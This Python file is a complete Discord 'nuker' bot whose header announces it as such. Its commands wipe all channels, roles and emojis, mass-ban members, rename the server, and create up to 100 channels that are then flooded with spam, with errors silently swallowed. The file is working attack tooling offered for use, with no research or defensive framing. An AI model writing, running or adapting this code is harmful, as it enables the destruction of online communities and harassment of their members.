'ULTIMATE NUKER BOT FOR DISCORD'
'BY MUHABBETKUSUDEV'

import discord
from discord.ext import commands, tasks
import random
import string
import asyncio

TOKEN = "YOUR_TOKEN_HERE" # replace with ur token

intents = discord.Intents.all()
activity = discord.Game(name="github.com/muhabbetkusudayi/Spammer")
bot = commands.Bot(
    command_prefix='!', 
    intents=intents, 
    help_command=None, 
    activity=activity,
    chunk_guilds_at_startup=False
)

spam_text = ""
spam_channels = []
spam_count = -1
spam_delay = 0.6
current_sent = 0
is_spamming = False

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    await bot.process_commands(message)

@tasks.loop(seconds=0.6)
async def global_spam_task():
    global current_sent
    if is_spamming and spam_channels:
        for channel in spam_channels:
            try: await channel.send(spam_text)
            except: pass
        current_sent += 1
        if spam_count != -1 and current_sent >= spam_count:
            global_spam_task.stop()

@bot.command()
async def reset(ctx):
    try: await ctx.guild.edit(name="Resetting...", icon=None, banner=None)
    except: pass
    
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: pass
        
    for role in ctx.guild.roles:
        try:
            if role.name != "@everyone" and not role.managed: await role.delete()
        except: pass
        
    for emoji in ctx.guild.emojis:
        try: await emoji.delete()
        except: pass

    await ctx.guild.create_text_channel("reset-completed")

@bot.command()
async def help(ctx):
    h = (
        "**🚀 Spammer Bot**\n\n"
        "`!reset` - Wipe EVERYTHING (Channels, Roles, Emojis)\n"
        "`!gg` / `!gg noban` - Destruction mode\n"
        "`!party` / `!party noban` - Chaos mode\n"
        "`!spamstart` / `!spambomb` / `!spamend` - Spam tools\n"
        "`!delete` - Delete all channels\n"
        "`!create <name> <n>` - Mass create\n"
        "`!kaboom` - Random channel burst"
    )
    await ctx.send(h)

async def perform_gg(ctx, ban_people=True):
    global spam_text, spam_channels, is_spamming, current_sent
    try: await ctx.guild.edit(name="BY MUHABBETKUSUDEV")
    except: pass
    if ban_people:
        for member in ctx.guild.members:
            try:
                if member != bot.user and member != ctx.guild.owner: await member.ban()
            except: pass
    for role in ctx.guild.roles:
        try:
            if role.name != "@everyone" and not role.managed: await role.delete()
        except: pass
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: pass
    spam_text = "gg"
    spam_channels = []
    current_sent = 0
    is_spamming = True
    for i in range(100):
        try:
            new_ch = await ctx.guild.create_text_channel("ezcerez")
            spam_channels.append(new_ch)
        except: break
    if not global_spam_task.is_running(): global_spam_task.start()

@bot.command()
async def gg(ctx, arg=None):
    should_ban = False if arg == "noban" else True
    await perform_gg(ctx, ban_people=should_ban)

@bot.command()
async def party(ctx, arg=None):
    should_ban = False if arg == "noban" else True
    if should_ban:
        for _ in range(random.randint(5, 10)):
            try: await random.choice(ctx.guild.members).ban()
            except: pass
    for _ in range(random.randint(5, 10)):
        try:
            r = random.choice(ctx.guild.roles)
            if not r.managed: await r.delete()
        except: pass
    for _ in range(20):
        try: await ctx.guild.create_text_channel("".join(random.choices(string.ascii_lowercase, k=8)))
        except: pass

@bot.command()
async def kaboom(ctx):
    for _ in range(50):
        try: await ctx.guild.create_text_channel(random.choice(["hacked", "gg", "rip"]))
        except: break

@bot.command()
async def delete(ctx):
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: pass

@bot.command()
async def create(ctx, name: str, count: int):
    for _ in range(count):
        try: await ctx.guild.create_text_channel(name)
        except: break

@bot.command()
async def spamstart(ctx, message: str, channel: discord.TextChannel):
    global spam_text, spam_channels, current_sent, is_spamming
    spam_text, spam_channels, current_sent, is_spamming = message, [channel], 0, True
    global_spam_task.change_interval(seconds=spam_delay)
    if not global_spam_task.is_running(): global_spam_task.start()

@bot.command()
async def spambomb(ctx, *, message: str):
    global spam_text, spam_channels, current_sent, is_spamming
    spam_text = message
    spam_channels = [ch for ch in ctx.guild.text_channels if ch.permissions_for(ctx.guild.me).send_messages]
    current_sent, is_spamming = 0, True
    global_spam_task.change_interval(seconds=spam_delay)
    if not global_spam_task.is_running(): global_spam_task.start()

@bot.command()
async def spamend(ctx):
    global is_spamming
    is_spamming = False
    global_spam_task.stop()
    await ctx.send("Spam stopped.")

@bot.command()
async def spamnumber(ctx, count: int):
    global spam_count
    spam_count = count if count > 0 else -1
    await ctx.send(f"Limit: {spam_count}")

@bot.command()
async def spamdelay(ctx, seconds: float):
    global spam_delay
    spam_delay = seconds
    if global_spam_task.is_running(): global_spam_task.change_interval(seconds=seconds)
    await ctx.send(f"Interval: {seconds}s")

async def run_bot():
    async with bot: await bot.start(TOKEN)

if __name__ == "__main__":
    asyncio.run(run_bot())